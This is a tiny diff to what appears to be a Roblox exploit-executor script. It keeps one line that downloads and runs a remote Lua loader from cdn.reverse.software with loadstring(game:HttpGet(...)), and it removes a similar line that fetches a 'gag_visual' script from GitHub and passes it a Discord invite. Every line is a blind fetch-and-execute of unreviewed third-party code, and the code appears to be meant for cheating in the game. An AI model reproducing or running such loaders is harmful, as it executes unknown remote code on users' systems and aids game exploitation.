@@ -1,4 +1,2 @@
 ID="9c0befc0-f53a-4351-9ab4-f2a6141ed94e";
 loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
